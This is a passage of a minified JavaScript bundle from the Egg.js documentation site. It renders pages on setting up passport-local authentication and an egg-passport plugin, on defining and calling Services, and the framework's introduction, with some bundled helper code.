icon-link"})),"Installation"),r.a.createElement(o["a"],{code:"$ npm i --save passport-local",lang:"bash"}),r.a.createElement("h3",{id:"configuration-1"},r.a.createElement(l["AnchorLink"],{to:"#configuration-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Configuration"),r.a.createElement(o["a"],{code:"// app.js\nconst LocalStrategy = require('passport-local').Strategy;\n\nmodule.exports = (app) => {\n  // Mount strategy\n  app.passport.use(\n    new LocalStrategy(\n      {\n        passReqToCallback: true,\n      },\n      (req, username, password, done) => {\n        // format user\n        const user = {\n          provider: 'local',\n          username,\n          password,\n        };\n        debug('%s %s get user: %j', req.method, req.url, user);\n        app.passport.doVerify(req, user, done);\n      },\n    ),\n  ); // Process user information\n\n  app.passport.verify(async (ctx, user) => {});\n  app.passport.serializeUser(async (ctx, user) => {});\n  app.passport.deserializeUser(async (ctx, user) => {});\n};",lang:"js"}),r.a.createElement("h3",{id:"mounting-routes-1"},r.a.createElement(l["AnchorLink"],{to:"#mounting-routes-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Mounting Routes"),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  const { router, controller } = app;\n  router.get('/', controller.home.index); // Callback page after successful authentication\n\n  router.get('/authCallback', controller.home.authCallback); // Render login page, user inputs account password\n\n  router.get('/login', controller.home.login); // Login verification\n  router.post(\n    '/login',\n    app.passport.authenticate('local', { successRedirect: '/authCallback' }),\n  );\n};",lang:"js"}),r.a.createElement("h2",{id:"how-to-develop-an-egg-passport-plugin"},r.a.createElement(l["AnchorLink"],{to:"#how-to-develop-an-egg-passport-plugin","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"How to develop an egg-passport plugin"),r.a.createElement("p",null,"In the previous section, we learned how to use a Passport middleware in the framework. We can further encapsulate it as a plugin and give back to the community."),r.a.createElement("p",null,r.a.createElement("strong",null,"initialization:")),r.a.createElement(o["a"],{code:"$ npm init egg --type=plugin egg-passport-local",lang:"bash"}),r.a.createElement("p",null,r.a.createElement("strong",null,"Configure dependencies in ",r.a.createElement("code",null,"package.json"),":")),r.a.createElement(o["a"],{code:'{\n  "name": "egg-passport-local",\n  "version": "1.0.0",\n  "eggPlugin": {\n    "name": "passportLocal",\n    "dependencies": ["passport"]\n  },\n  "dependencies": {\n    "passport-local": "^1.0.0"\n  }\n}',lang:"json"}),r.a.createElement("p",null,r.a.createElement("strong",null,"Configuration:")),r.a.createElement(o["a"],{code:"// {plugin_root}/config/config.default.js\n// https://github.com/jaredhanson/passport-local\nexports.passportLocal = {};",lang:"js"}),r.a.createElement("p",null,"Note: ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-passport"},"egg-passport")," standardizes the configuration fields, which are unified as ",r.a.createElement("code",null,"key")," and ",r.a.createElement("code",null,"secret"),", so if the corresponding Passport middleware attribute names are inconsistent, the developer should do the conversion."),r.a.createElement("p",null,r.a.createElement("strong",null,"Register the passport middleware:")),r.a.createElement(o["a"],{code:"// {plugin_root}/app.js\nconst LocalStrategy = require('passport-local').Strategy;\n\nmodule.exports = (app) => {\n  const config = app.config.passportLocal;\n  config.passReqToCallback = true;\n\n  app.passport.use(\n    new LocalStrategy(config, (req, username, password, done) => {\n      // Cleans up the data returned by the Passport plugin and returns the User object\n      const user = {\n        provider: 'local',\n        username,\n        password,\n      }; // This does not process application-level logic and passes it to app.passport.verify for unified processing.\n      app.passport.doVerify(req, user, done);\n    }),\n  );\n};",lang:"js"})))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},"+Ooz":function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"\u7b80\u5355\u6765\u8bf4\uff0cService \u5c31\u662f\u5728\u590d\u6742\u4e1a\u52a1\u573a\u666f\u4e0b\u7528\u4e8e\u505a\u4e1a\u52a1\u903b\u8f91\u5c01\u88c5\u7684\u4e00\u4e2a\u62bd\u8c61\u5c42\uff0c\u63d0\u4f9b\u8fd9\u4e2a\u62bd\u8c61\u6709\u4ee5\u4e0b\u51e0\u4e2a\u597d\u5904\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u4fdd\u6301 Controller \u4e2d\u7684\u903b\u8f91\u66f4\u52a0\u7b80\u6d01\u3002"),r.a.createElement("li",null,"\u4fdd\u6301\u4e1a\u52a1\u903b\u8f91\u7684\u72ec\u7acb\u6027\uff0c\u62bd\u8c61\u51fa\u6765\u7684 Service \u53ef\u4ee5\u88ab\u591a\u4e2a Controller \u91cd\u590d\u8c03\u7528\u3002"),r.a.createElement("li",null,"\u5c06\u903b\u8f91\u548c\u5c55\u73b0\u5206\u79bb\uff0c\u66f4\u5bb9\u6613\u7f16\u5199\u6d4b\u8bd5\u7528\u4f8b\uff0c\u6d4b\u8bd5\u7528\u4f8b\u7684\u7f16\u5199\u5177\u4f53\u53ef\u4ee5\u67e5\u770b",r.a.createElement(l["Link"],{to:"../core/unittest"},"\u8fd9\u91cc"),"\u3002")),r.a.createElement("h2",{id:"\u4f7f\u7528\u573a\u666f"},r.a.createElement(l["AnchorLink"],{to:"#\u4f7f\u7528\u573a\u666f","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4f7f\u7528\u573a\u666f"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u590d\u6742\u6570\u636e\u7684\u5904\u7406\uff0c\u6bd4\u5982\u8981\u5c55\u73b0\u7684\u4fe1\u606f\u9700\u8981\u4ece\u6570\u636e\u5e93\u83b7\u53d6\uff0c\u8fd8\u8981\u7ecf\u8fc7\u4e00\u5b9a\u7684\u89c4\u5219\u8ba1\u7b97\uff0c\u624d\u80fd\u8fd4\u56de\u7528\u6237\u663e\u793a\u3002\u6216\u8005\u8ba1\u7b97\u5b8c\u6210\u540e\uff0c\u66f4\u65b0\u5230\u6570\u636e\u5e93\u3002"),r.a.createElement("li",null,"\u7b2c\u4e09\u65b9\u670d\u52a1\u7684\u8c03\u7528\uff0c\u6bd4\u5982 GitHub \u4fe1\u606f\u83b7\u53d6\u7b49\u3002")),r.a.createElement("h2",{id:"\u5b9a\u4e49-service"},r.a.createElement(l["AnchorLink"],{to:"#\u5b9a\u4e49-service","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5b9a\u4e49 Service"),r.a.createElement(o["a"],{code:"// app/service/user.js\nconst Service = require('egg').Service;\n\nclass UserService extends Service {\n  async find(uid) {\n    const user = await this.ctx.db.query(\n      'select * from user where uid = ?',\n      uid,\n    );\n    return user;\n  }\n}\n\nmodule.exports = UserService;",lang:"js"}),r.a.createElement("h3",{id:"\u5c5e\u6027"},r.a.createElement(l["AnchorLink"],{to:"#\u5c5e\u6027","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5c5e\u6027"),r.a.createElement("p",null,"\u6bcf\u4e00\u6b21\u7528\u6237\u8bf7\u6c42\uff0c\u6846\u67b6\u90fd\u4f1a\u5b9e\u4f8b\u5316\u5bf9\u5e94\u7684 Service \u5b9e\u4f8b\uff0c\u7531\u4e8e\u5b83\u7ee7\u627f\u4e8e ",r.a.createElement("code",null,"egg.Service"),"\uff0c\u6545\u62e5\u6709\u4e0b\u5217\u5c5e\u6027\u65b9\u4fbf\u6211\u4eec\u8fdb\u884c\u5f00\u53d1\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"this.ctx"),": \u5f53\u524d\u8bf7\u6c42\u7684\u4e0a\u4e0b\u6587 ",r.a.createElement(l["AnchorLink"],{to:"./extend#context"},"Context")," \u5bf9\u8c61\u7684\u5b9e\u4f8b\uff0c\u901a\u8fc7\u5b83\u6211\u4eec\u53ef\u4ee5\u62ff\u5230\u6846\u67b6\u5c01\u88c5\u597d\u7684\u5904\u7406\u5f53\u524d\u8bf7\u6c42\u7684\u5404\u79cd\u4fbf\u6377\u5c5e\u6027\u548c\u65b9\u6cd5\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"this.app"),": \u5f53\u524d\u5e94\u7528 ",r.a.createElement(l["AnchorLink"],{to:"./extend#application"},"Application")," \u5bf9\u8c61\u7684\u5b9e\u4f8b\uff0c\u901a\u8fc7\u5b83\u6211\u4eec\u53ef\u4ee5\u62ff\u5230\u6846\u67b6\u63d0\u4f9b\u7684\u5168\u5c40\u5bf9\u8c61\u548c\u65b9\u6cd5\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"this.service"),"\uff1a\u5e94\u7528\u5b9a\u4e49\u7684 ",r.a.createElement(l["Link"],{to:"./service"},"Service"),"\uff0c\u901a\u8fc7\u5b83\u6211\u4eec\u53ef\u4ee5\u8bbf\u95ee\u5230\u5176\u4ed6\u4e1a\u52a1\u5c42\uff0c\u7b49\u4ef7\u4e8e ",r.a.createElement("code",null,"this.ctx.service")," \u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"this.config"),"\uff1a\u5e94\u7528\u8fd0\u884c\u65f6\u7684",r.a.createElement(l["Link"],{to:"./config"},"\u914d\u7f6e\u9879"),"\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"this.logger"),"\uff1alogger \u5bf9\u8c61\uff0c\u4e0a\u9762\u6709\u56db\u4e2a\u65b9\u6cd5\uff08",r.a.createElement("code",null,"debug"),"\uff0c",r.a.createElement("code",null,"info"),"\uff0c",r.a.createElement("code",null,"warn"),"\uff0c",r.a.createElement("code",null,"error"),"\uff09\uff0c\u5206\u522b\u4ee3\u8868\u6253\u5370\u56db\u4e2a\u4e0d\u540c\u7ea7\u522b\u7684\u65e5\u5fd7\uff0c\u4f7f\u7528\u65b9\u6cd5\u548c\u6548\u679c\u4e0e ",r.a.createElement(l["AnchorLink"],{to:"../core/logger#context-logger"},"context logger")," \u4e2d\u4ecb\u7ecd\u7684\u4e00\u6837\uff0c\u4f46\u662f\u901a\u8fc7\u8fd9\u4e2a logger \u5bf9\u8c61\u8bb0\u5f55\u7684\u65e5\u5fd7\uff0c\u5728\u65e5\u5fd7\u524d\u9762\u4f1a\u52a0\u4e0a\u6253\u5370\u8be5\u65e5\u5fd7\u7684\u6587\u4ef6\u8def\u5f84\uff0c\u4ee5\u4fbf\u5feb\u901f\u5b9a\u4f4d\u65e5\u5fd7\u6253\u5370\u4f4d\u7f6e\u3002")),r.a.createElement("h3",{id:"service-ctx-\u8be6\u89e3"},r.a.createElement(l["AnchorLink"],{to:"#service-ctx-\u8be6\u89e3","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Service ctx \u8be6\u89e3"),r.a.createElement("p",null,"\u4e3a\u4e86\u53ef\u4ee5\u83b7\u53d6\u7528\u6237\u8bf7\u6c42\u7684\u94fe\u8def\uff0c\u6211\u4eec\u5728 Service \u521d\u59cb\u5316\u4e2d\uff0c\u6ce8\u5165\u4e86\u8bf7\u6c42\u4e0a\u4e0b\u6587, \u7528\u6237\u5728\u65b9\u6cd5\u4e2d\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 ",r.a.createElement("code",null,"this.ctx")," \u6765\u83b7\u53d6\u4e0a\u4e0b\u6587\u76f8\u5173\u4fe1\u606f\u3002\u5173\u4e8e\u4e0a\u4e0b\u6587\u7684\u5177\u4f53\u8be6\u89e3\u53ef\u4ee5\u53c2\u770b ",r.a.createElement(l["AnchorLink"],{to:"./extend#context"},"Context"),", \u6709\u4e86 ctx \u6211\u4eec\u53ef\u4ee5\u62ff\u5230\u6846\u67b6\u7ed9\u6211\u4eec\u5c01\u88c5\u7684\u5404\u79cd\u4fbf\u6377\u5c5e\u6027\u548c\u65b9\u6cd5\u3002\u6bd4\u5982\u6211\u4eec\u53ef\u4ee5\u7528\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"this.ctx.curl")," \u53d1\u8d77\u7f51\u7edc\u8c03\u7528\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"this.ctx.service.otherService")," \u8c03\u7528\u5176\u4ed6 Service\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"this.ctx.db")," \u53d1\u8d77\u6570\u636e\u5e93\u8c03\u7528\u7b49\uff0c db \u53ef\u80fd\u662f\u5176\u4ed6\u63d2\u4ef6\u63d0\u524d\u6302\u8f7d\u5230 app \u4e0a\u7684\u6a21\u5757\u3002")),r.a.createElement("h3",{id:"\u6ce8\u610f\u4e8b\u9879"},r.a.createElement(l["AnchorLink"],{to:"#\u6ce8\u610f\u4e8b\u9879","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6ce8\u610f\u4e8b\u9879"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("p",null,"Service \u6587\u4ef6\u5fc5\u987b\u653e\u5728 ",r.a.createElement("code",null,"app/service")," \u76ee\u5f55\uff0c\u53ef\u4ee5\u652f\u6301\u591a\u7ea7\u76ee\u5f55\uff0c\u8bbf\u95ee\u7684\u65f6\u5019\u53ef\u4ee5\u901a\u8fc7\u76ee\u5f55\u540d\u7ea7\u8054\u8bbf\u95ee\u3002"),r.a.createElement(o["a"],{code:"app/service/biz/user.js => ctx.service.biz.user\napp/service/sync_user.js => ctx.service.syncUser\napp/service/HackerNews.js => ctx.service.hackerNews",lang:"js"})),r.a.createElement("li",null,r.a.createElement("p",null,"\u4e00\u4e2a Service \u6587\u4ef6\u53ea\u80fd\u5305\u542b\u4e00\u4e2a\u7c7b\uff0c \u8fd9\u4e2a\u7c7b\u9700\u8981\u901a\u8fc7 ",r.a.createElement("code",null,"module.exports")," \u7684\u65b9\u5f0f\u8fd4\u56de\u3002")),r.a.createElement("li",null,r.a.createElement("p",null,"Service \u9700\u8981\u901a\u8fc7 Class \u7684\u65b9\u5f0f\u5b9a\u4e49\uff0c\u7236\u7c7b\u5fc5\u987b\u662f ",r.a.createElement("code",null,"egg.Service"),"\u3002")),r.a.createElement("li",null,r.a.createElement("p",null,"Service \u4e0d\u662f\u5355\u4f8b\uff0c\u662f ",r.a.createElement("strong",null,"\u8bf7\u6c42\u7ea7\u522b")," \u7684\u5bf9\u8c61\uff0c\u6846\u67b6\u5728\u6bcf\u6b21\u8bf7\u6c42\u4e2d\u9996\u6b21\u8bbf\u95ee ",r.a.createElement("code",null,"ctx.service.xx")," \u65f6\u5ef6\u8fdf\u5b9e\u4f8b\u5316\uff0c\u6240\u4ee5 Service \u4e2d\u53ef\u4ee5\u901a\u8fc7 this.ctx \u83b7\u53d6\u5230\u5f53\u524d\u8bf7\u6c42\u7684\u4e0a\u4e0b\u6587\u3002"))),r.a.createElement("h2",{id:"\u4f7f\u7528-service"},r.a.createElement(l["AnchorLink"],{to:"#\u4f7f\u7528-service","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4f7f\u7528 Service"),r.a.createElement("p",null,"\u4e0b\u9762\u5c31\u901a\u8fc7\u4e00\u4e2a\u5b8c\u6574\u7684\u4f8b\u5b50\uff0c\u770b\u770b\u600e\u4e48\u4f7f\u7528 Service\u3002"),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  app.router.get('/user/:id', app.controller.user.info);\n};\n\n// app/controller/user.js\nconst Controller = require('egg').Controller;\nclass UserController extends Controller {\n  async info() {\n    const { ctx } = this;\n    const userId = ctx.params.id;\n    const userInfo = await ctx.service.user.find(userId);\n    ctx.body = userInfo;\n  }\n}\nmodule.exports = UserController;\n\n// app/service/user.js\nconst Service = require('egg').Service;\nclass UserService extends Service {\n  // \u9ed8\u8ba4\u4e0d\u9700\u8981\u63d0\u4f9b\u6784\u9020\u51fd\u6570\u3002\n  // constructor(ctx) {\n  //   super(ctx); \u5982\u679c\u9700\u8981\u5728\u6784\u9020\u51fd\u6570\u505a\u4e00\u4e9b\u5904\u7406\uff0c\u4e00\u5b9a\u8981\u6709\u8fd9\u53e5\u8bdd\uff0c\u624d\u80fd\u4fdd\u8bc1\u540e\u9762 `this.ctx`\u7684\u4f7f\u7528\u3002\n  //   // \u5c31\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 this.ctx \u83b7\u53d6 ctx \u4e86\n  //   // \u8fd8\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 this.app \u83b7\u53d6 app \u4e86\n  // }\n  async find(uid) {\n    // \u5047\u5982 \u6211\u4eec\u62ff\u5230\u7528\u6237 id \u4ece\u6570\u636e\u5e93\u83b7\u53d6\u7528\u6237\u8be6\u7ec6\u4fe1\u606f\n    const user = await this.ctx.db.query(\n      'select * from user where uid = ?',\n      uid,\n    );\n\n    // \u5047\u5b9a\u8fd9\u91cc\u8fd8\u6709\u4e00\u4e9b\u590d\u6742\u7684\u8ba1\u7b97\uff0c\u7136\u540e\u8fd4\u56de\u9700\u8981\u7684\u4fe1\u606f\u3002\n    const picture = await this.getPicture(uid);\n\n    return {\n      name: user.user_name,\n      age: user.age,\n      picture,\n    };\n  }\n\n  async getPicture(uid) {\n    const result = await this.ctx.curl(`http://photoserver/uid=${uid}`, {\n      dataType: 'json',\n    });\n    return result.data;\n  }\n}\nmodule.exports = UserService;\n\n// curl http://127.0.0.1:7001/user/1234",lang:"js"})))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},"+g4N":function(e,t,n){"use strict";n.d(t,"a",(function(){return l}));var a=n("fnGi");function r(e,t){for(var n=0;n<t.length;n++){var r=t[n];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(e,Object(a["a"])(r.key),r)}}function l(e,t,n){return t&&r(e.prototype,t),n&&r(e,n),Object.defineProperty(e,"prototype",{writable:!1}),e}},"+ljs":function(e,t,n){"use strict";var a=n("0mt+"),r=n("m4/z"),l=n("XccI");a({target:"Map",proto:!0,real:!0,forced:r},{deleteAll:function(){return l.apply(this,arguments)}})},"+p3P":function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,r.a.createElement("strong",null,"Egg.js \u4e3a\u4f01\u4e1a\u7ea7\u6846\u67b6\u548c\u5e94\u7528\u800c\u751f"),"\uff0c\u6211\u4eec\u5e0c\u671b\u7531 Egg.js \u5b55\u80b2\u51fa\u66f4\u591a\u4e0a\u5c42\u6846\u67b6\uff0c\u5e2e\u52a9\u5f00\u53d1\u56e2\u961f\u548c\u5f00\u53d1\u4eba\u5458\u964d\u4f4e\u5f00\u53d1\u548c\u7ef4\u62a4\u6210\u672c\u3002"),r.a.createElement("blockquote",null,r.a.createElement("p",null,"\u6ce8\uff1aEgg.js \u7f29\u5199\u4e3a Egg")),r.a.createElement("h2",{id:"\u8bbe\u8ba1\u539f\u5219"},r.a.createElement(l["AnchorLink"],{to:"#\u8bbe\u8ba1\u539f\u5219","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u8bbe\u8ba1\u539f\u5219"),r.a.createElement("p",null,"\u6211\u4eec\u6df1\u77e5\u4f01\u4e1a\u7ea7\u5e94\u7528\u5728\u8ffd\u6c42\u89c4\u8303\u548c\u5171\u5efa\u7684\u540c\u65f6\uff0c\u8fd8\u9700\u8981\u8003\u8651\u5982\u4f55\u5e73\u8861\u4e0d\u540c\u56e2\u961f\u4e4b\u95f4\u7684\u5dee\u5f02\uff0c\u6c42\u540c\u5b58\u5f02\u3002\u6240\u4ee5\u6211\u4eec\u6ca1\u6709\u9009\u62e9\u793e\u533a\u5e38\u89c1\u6846\u67b6\u7684\u5927\u96c6\u5e02\u6a21\u5f0f\uff08\u96c6\u6210\u5982\u6570\u636e\u5e93\u3001\u6a21\u677f\u5f15\u64ce\u3001\u524d\u7aef\u6846\u67b6\u7b49\u529f\u80fd\uff09\uff0c\u800c\u662f\u4e13\u6ce8\u4e8e\u63d0\u4f9b Web \u5f00\u53d1\u7684\u6838\u5fc3\u529f\u80fd\u548c\u4e00\u5957\u7075\u6d3b\u53ef\u6269\u5c55\u7684\u63d2\u4ef6\u673a\u5236\u3002\u6211\u4eec\u4e0d\u4f1a\u505a\u51fa\u6280\u672f\u9009\u578b\uff0c\u56e0\u4e3a\u56fa\u5b9a\u7684\u6280\u672f\u9009\u578b\u4f1a\u4f7f\u6846\u67b6\u7684\u6269\u5c55\u6027\u53d8\u5dee\uff0c\u65e0\u6cd5\u6ee1\u8db3\u5404\u79cd\u5b9a\u5236\u9700\u6c42\u3002\u901a\u8fc7 Egg\uff0c\u56e2\u961f\u7684\u67b6\u6784\u5e08\u548c\u6280\u672f\u8d1f\u8d23\u4eba\u53ef\u4ee5\u975e\u5e38\u5bb9\u6613\u5730\u57fa\u4e8e\u81ea\u8eab\u7684\u6280\u672f\u67b6\u6784\u5728 Egg \u57fa\u7840\u4e0a\u6269\u5c55\u51fa\u9002\u5408\u81ea\u8eab\u4e1a\u52a1\u573a\u666f\u7684\u6846\u67b6\u3002"),r.a.createElement("p",null,"Egg \u7684\u63d2\u4ef6\u673a\u5236\u6709\u5f88\u9ad8\u7684\u53ef\u6269\u5c55\u6027\uff0c",r.a.createElement("strong",null,"\u4e00\u4e2a\u63d2\u4ef6\u53ea\u505a\u4e00\u4ef6\u4e8b"),"\uff08\u6bd4\u5982 ",r.a.createElement(l["Link"],{to:"https://mozilla.github.io/nunjucks"},"Nunjucks")," \u6a21\u677f\u5c01\u88c5\u6210\u4e86 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view-nunjucks"},"egg-view-nunjucks"),"\u3001MySQL \u6570\u636e\u5e93\u5c01\u88c5\u6210\u4e86 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-mysql"},"egg-mysql"),"\uff09\u3002Egg \u901a\u8fc7\u6846\u67b6\u805a\u5408\u8fd9\u4e9b\u63d2\u4ef6\uff0c\u5e76\u6839\u636e\u81ea\u5df1\u7684\u4e1a\u52a1\u573a\u666f\u5b9a\u5236\u914d\u7f6e\uff0c\u8fd9\u6837\u5e94\u7528\u7684\u5f00\u53d1\u6210\u672c\u5c31\u53d8\u5f97\u5f88\u4f4e\u3002"),r.a.createElement("p",null,"Egg \u5949\u884c\u300e",r.a.createElement("strong",null,"\u7ea6\u5b9a\u4f18\u4e8e\u914d\u7f6e"),"\u300f\uff0c\u6309\u7167",r.a.createElement(l["Link"],{to:"./advanced/loader"},"\u4e00\u5957\u7edf\u4e00\u7684\u7ea6\u5b9a"),"\u8fdb\u884c\u5e94\u7528\u5f00\u53d1\uff0c\u56e2\u961f\u5185\u90e8\u91c7\u7528\u8fd9\u79cd\u65b9\u5f0f\u53ef\u4ee5\u51cf\u5c11\u5f00\u53d1\u4eba\u5458\u7684\u5b66\u4e60\u6210\u672c\uff0c\u5f00\u53d1\u4eba\u5458\u4e0d\u518d\u662f\u300e\u9489\u5b50\u300f\uff0c\u53ef\u4ee5\u6d41\u52a8\u8d77\u6765\u3002\u6ca1\u6709\u7ea6\u5b9a\u7684\u56e2\u961f\uff0c\u6c9f\u901a\u6210\u672c\u662f\u975e\u5e38\u9ad8\u7684\uff0c\u6bd4\u5982\u6709\u4eba\u4f1a\u6309\u76ee\u5f55\u5206\u6808\u800c\u5176\u4ed6\u4eba\u6309\u76ee\u5f55\u5206\u529f\u80fd\uff0c\u5f00\u53d1\u8005\u8ba4\u77e5\u4e0d\u4e00\u81f4\u5f88\u5bb9\u6613\u72af\u9519\u3002\u4f46\u7ea6\u5b9a\u4e0d\u7b49\u4e8e\u6269\u5c55\u6027\u5dee\uff0c\u76f8\u53cd Egg \u6709\u5f88\u9ad8\u7684\u6269\u5c55\u6027\uff0c\u53ef\u4ee5\u6309\u7167\u56e2\u961f\u7684\u7ea6\u5b9a\u5b9a\u5236\u6846\u67b6\u3002\u4f7f\u7528 ",r.a.createElement(l["Link"],{to:"./advanced/loader"},"Loader")," \u53ef\u4ee5\u8ba9\u6846\u67b6\u6839\u636e\u4e0d\u540c\u73af\u5883\u5b9a\u4e49\u9ed8\u8ba4\u914d\u7f6e\uff0c\u8fd8\u53ef\u4ee5\u8986\u76d6 Egg \u7684\u9ed8\u8ba4\u7ea6\u5b9a\u3002"),r.a.createElement("h2",{id:"\u4e0e\u793e\u533a\u6846\u67b6\u7684\u5dee\u5f02"},r.a.createElement(l["AnchorLink"],{to:"#\u4e0e\u793e\u533a\u6846\u67b6\u7684\u5dee\u5f02","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4e0e\u793e\u533a\u6846\u67b6\u7684\u5dee\u5f02"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"http://expressjs.com/"},"Express")," \u662f Node.js \u793e\u533a\u5e7f\u6cdb\u4f7f\u7528\u7684\u6846\u67b6\uff0c\u7b80\u5355\u4e14\u6269\u5c55\u6027\u5f3a\uff0c\u975e\u5e38\u9002\u5408\u505a\u4e2a\u4eba\u9879\u76ee\u3002\u4f46\u6846\u67b6\u672c\u8eab\u7f3a\u5c11\u7ea6\u5b9a\uff0c\u6807\u51c6\u7684 MVC \u6a21\u578b\u4f1a\u6709\u5404\u79cd\u5343\u5947\u767e\u602a\u7684\u5199\u6cd5\u3002Egg \u6309\u7167\u7ea6\u5b9a\u8fdb\u884c\u5f00\u53d1\uff0c\u5949\u884c\u300e\u7ea6\u5b9a\u4f18\u4e8e\u914d\u7f6e\u300f\uff0c\u56e2\u961f\u534f\u4f5c\u6210\u672c\u4f4e\u3002"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"http://sailsjs.com/"},"Sails")," \u662f\u548c Egg \u4e00\u6837\u5949\u884c\u300e\u7ea6\u5b9a\u4f18\u4e8e\u914d\u7f6e\u300f\u7684\u6846\u67b6\uff0c\u6269\u5c55\u6027\u4e5f\u975e\u5e38\u597d\u3002\u4f46\u662f\u76f8\u6bd4 Egg\uff0c",r.a.createElement(l["Link"],{to:"http://sailsjs.com/"},"Sails")," \u652f\u6301 Blueprint REST API\u3001",r.a.createElement(l["Link"],{to:"https://github.com/balderdashy/waterline"},"WaterLine")," \u8fd9\u6837\u53ef\u6269\u5c55\u7684 ORM\u3001\u524d\u7aef\u96c6\u6210\u3001WebSocket \u7b49\uff0c\u4f46\u8fd9\u4e9b\u529f\u80fd\u90fd\u662f\u7531 ",r.a.createElement(l["Link"],{to:"http://sailsjs.com/"},"Sails")," \u63d0\u4f9b\u7684\u3002\u800c Egg \u4e0d\u76f4\u63a5\u63d0\u4f9b\u529f\u80fd\uff0c\u53ea\u662f\u96c6\u6210\u5404\u79cd\u529f\u80fd\u63d2\u4ef6\uff0c\u6bd4\u5982\u5b9e\u73b0 egg-blueprint\uff0cegg-waterline \u7b49\u8fd9\u6837\u7684\u63d2\u4ef6\uff0c\u518d\u4f7f\u7528 sails-egg \u6846\u67b6\u6574\u5408\u8fd9\u4e9b\u63d2\u4ef6\u5c31\u53ef\u4ee5\u66ff\u4ee3 ",r.a.createElement(l["Link"],{to:"http://sailsjs.com/"},"Sails")," \u4e86\u3002"),r.a.createElement("h2",{id:"\u7279\u6027"},r.a.createElement(l["AnchorLink"],{to:"#\u7279\u6027","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u7279\u6027"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u63d0\u4f9b\u57fa\u4e8e Egg ",r.a.createElement(l["Link"],{to:"./advanced/framework"},"\u5b9a\u5236\u4e0a\u5c42\u6846\u67b6"),"\u7684\u80fd\u529b"),r.a.createElement("li",null,"\u9ad8\u5ea6\u53ef\u6269\u5c55\u7684",r.a.createElement(l["Link"],{to:"./basics/plugin"},"\u63d2\u4ef6\u673a\u5236")),r.a.createElement("li",null,"\u5185\u7f6e",r.a.createElement(l["Link"],{to:"./advanced/cluster-client"},"\u591a\u8fdb\u7a0b\u7ba1\u7406")),r.a.createElement("li",null,"\u57fa\u4e8e ",r.a.createElement(l["Link"],{to:"http://koajs.com/"},"Koa")," \u5f00\u53d1\uff0c\u6027\u80fd\u4f18\u5f02"),r.a.createElement("li",null,"\u6846\u67b6\u7a33\u5b9a\uff0c\u6d4b\u8bd5\u8986\u76d6\u7387\u9ad8"),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./intro/progressive"},"\u6e10\u8fdb\u5f0f\u5f00\u53d1")))))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(o,{demos:n})}},"+ujd":function(e,t,n){"use strict";function a(e){return a=Object.setPrototypeOf?Object.getPrototypeOf.bind():function(e){return e.__proto__||Object.getPrototypeOf(e)},a(e)}function r(){if("undefined"===typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"===typeof Proxy)return!0;try{return 